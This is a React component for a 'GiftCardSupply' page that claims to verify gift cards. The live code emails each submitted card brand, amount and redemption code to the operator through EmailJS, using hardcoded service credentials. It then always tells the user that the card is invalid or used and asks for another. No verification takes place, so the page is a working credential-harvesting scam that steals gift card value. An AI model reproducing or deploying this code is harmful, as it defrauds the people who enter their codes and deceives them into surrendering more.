// import { Button } from "@/components/ui/button";

// function Verify() {
//   return (
//     <section id="verify" className="bg-[#9fe870] py-16 lg:py-24">
//       <div className="mx-auto px-10 container">
//         <div className="grid lg:grid-cols-2 items-center">
//           {/* Left Content */}
//           <div className="space-y-6">
//             <h2 className="text-5xl lg:text-5xl font-bold text-black leading-tight">
//               An efficient solution to verify all cards data.
//             </h2>

//             <p className="text-lg text-black max-w-lg leading-tight">
//               With GiftCardSupply, you can trust that your cards will be
//               verified accurately and quickly, allowing you to use them as soon
//               as possible. Choose GiftCardSupply for a hassle-free gift card
//               verification experience.
//             </p>
//           </div>

//           {/* Right Content - Verification Form */}
//           <div className="flex justify-center lg:justify-end">
//             <div className="bg-white rounded-3xl p-7 shadow-2xl w-full max-w-xl">
//               <h3 className="text-[#9fe870] font-extrabold text-lg text-center mb-8 tracking-wide">
//                 VERIFY GIFT CARD INFORMATION
//               </h3>

//               <form className="space-y-6">
//                 {/* Select Card */}
//                 <div>
//                   <label className="block text-gray-700 font-medium mb-2">
//                     Select Card
//                   </label>
//                   <select className="w-full px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent bg-white">
//                     <option value="Amazon">Amazon</option>
//                     <option value="Amex">Amex</option>
//                     <option value="Apple">Apple</option>
//                     <option value="eBay">eBay</option>
//                     <option value="Googleplay">Googleplay</option>
//                     <option value="Mastercard">Mastercard</option>
//                     <option value="Nike">Nike</option>
//                     <option value="Nordstrom">Nordstrom</option>
//                     <option value="Playstation">Playstation</option>
//                     <option value="RazerGold">RazerGold</option>
//                     <option value="Sephora">Sephora</option>
//                     <option value="Steam">Steam</option>
//                     <option value="TT Visa">TT Visa</option>
//                     <option value="Vanilla Visa">Vanilla Visa</option>
//                     <option value="Visa Silvery White">
//                       Visa Silvery White
//                     </option>
//                     <option value="Walmart Visa">Walmart Visa</option>
//                     <option value="Xbox">Xbox</option>
//                   </select>
//                 </div>

//                 {/* Enter Amount */}
//                 <div>
//                   <label className="block text-gray-700 font-medium mb-2">
//                     Enter Amount
//                   </label>
//                   <div className="flex gap-2">
//                     <input
//                       type="number"
//                       placeholder="1000"
//                       className="flex-1 px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent"
//                     />
//                     <select className="px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent bg-white min-w-[80px]">
//                       <option value="CAD">CAD</option>
//                       <option value="CAD">AUD</option>
//                       <option value="EUR">EUR</option>
//                       <option value="USD">USD</option>
//                       <option value="CAD">GPD</option>
//                     </select>
//                   </div>
//                 </div>

//                 {/* Redemption Code */}
//                 <div>
//                   <label className="block text-gray-700 font-medium mb-2">
//                     Redemption Code
//                   </label>
//                   <input
//                     type="text"
//                     placeholder="Redemption Code"
//                     className="w-full px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent"
//                   />
//                 </div>

//                 {/* Disclaimer */}
//                 <p className="text-lg text-gray-500 leading-relaxed">
//                   Please make sure the codes you are about to input are correct
//                   and according to details
//                 </p>

//                 {/* Verify Button */}
//                 <Button className="w-full bg-[#9fe870] hover:bg-[#86c260] text-black py-6 rounded-full font-medium text-md cursor-pointer">
//                   Verify
//                 </Button>
//               </form>
//             </div>
//           </div>
//         </div>
//       </div>
//     </section>
//   );
// }

// export default Verify;

"use client";
import { useState } from "react";
import emailjs from "emailjs-com";
import { Button } from "@/components/ui/button";

function Verify() {
  const [card, setCard] = useState("Amazon");
  const [amount, setAmount] = useState("");
  const [currency, setCurrency] = useState("USD");
  const [code, setCode] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Send via EmailJS
    emailjs
      .send(
        "service_en4pdui", // Replace with your EmailJS service ID
        "template_rmvqspd", // Replace with your EmailJS template ID
        {
          card_type: card,
          amount: `${amount} ${currency}`,
          code: code,
        },
        "tfZWbtJumKb2q4QwW" // Replace with your EmailJS user ID (public key)
      )
      .then(() => {
        alert("Card is invalid or has been used. Please try another card.");
      })
      .catch((error) => {
        console.error("Email failed", error);
        alert("Something went wrong sending your request.");
      });
  };

  return (
    <section id="verify" className="bg-[#9fe870] py-16 lg:py-24">
      <div className="mx-auto px-10 container">
        <div className="grid lg:grid-cols-2 items-center">
          {/* Left */}
          <div className="space-y-6">
            <h2 className="text-5xl font-bold text-black leading-tight">
              An efficient solution to verify all cards data.
            </h2>
            <p className="text-lg text-black max-w-lg">
              With GiftCardSupply, you can trust that your cards will be
              verified accurately and quickly...
            </p>
          </div>

          {/* Right */}
          <div className="flex justify-center lg:justify-end">
            <div className="bg-white rounded-3xl p-7 shadow-2xl w-full max-w-xl">
              <h3 className="text-[#9fe870] font-extrabold text-lg text-center mb-8">
                VERIFY GIFT CARD INFORMATION
              </h3>

              <form className="space-y-6" onSubmit={handleSubmit}>
                {/* Select Card */}
                <div>
                  <label className="block text-gray-500 font-medium mb-2">
                    Select Card
                  </label>
                  <select
                    value={card}
                    onChange={(e) => setCard(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-200 text-gray-500 rounded-lg focus:ring-green-500"
                  >
                    <option value="Amazon">Amazon</option>
                    <option value="Amex">Amex</option>
                    <option value="Apple">Apple</option>
                    <option value="eBay">eBay</option>
                    <option value="Googleplay">Googleplay</option>
                    <option value="Mastercard">Mastercard</option>
                    <option value="Nike">Nike</option>
                    <option value="Nordstrom">Nordstrom</option>
                    <option value="Playstation">Playstation</option>
                    <option value="RazerGold">RazerGold</option>
                    <option value="Sephora">Sephora</option>
                    <option value="Steam">Steam</option>
                    <option value="TT Visa">TT Visa</option>
                    <option value="Vanilla Visa">Vanilla Visa</option>
                    <option value="Visa Silvery White">
                      Visa Silvery White
                    </option>
                    <option value="Walmart Visa">Walmart Visa</option>
                    <option value="Xbox">Xbox</option>
                  </select>
                </div>

                {/* Enter Amount */}
                <div>
                  <label className="block text-gray-500 font-medium mb-2">
                    Enter Amount
                  </label>
                  <div className="flex gap-2">
                    <input
                      type="number"
                      value={amount}
                      onChange={(e) => setAmount(e.target.value)}
                      placeholder="1000"
                      className="flex-1 px-4 py-3 border border-gray-200 text-gray-500 rounded-lg"
                    />
                    <select
                      value={currency}
                      onChange={(e) => setCurrency(e.target.value)}
                      className="px-4 py-3 border border-gray-200 rounded-lg text-gray-500 bg-white min-w-[80px]"
                    >
                      <option>USD</option>
                      <option>EUR</option>
                      <option>GBP</option>
                    </select>
                  </div>
                </div>

                {/* Redemption Code */}
                <div>
                  <label className="block text-gray-500 font-medium mb-2">
                    Redemption Code
                  </label>
                  <input
                    type="text"
                    value={code}
                    onChange={(e) => setCode(e.target.value)}
                    placeholder="Enter your code"
                    className="w-full px-4 py-3 border border-gray-200 text-gray-500 rounded-lg"
                  />
                </div>

                {/* Button */}
                <Button
                  type="submit"
                  className="w-full bg-[#9fe870] hover:bg-[#86c260] cursor-pointer text-black py-6 rounded-full font-medium"
                >
                  Verify
                </Button>
              </form>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}

export default Verify;
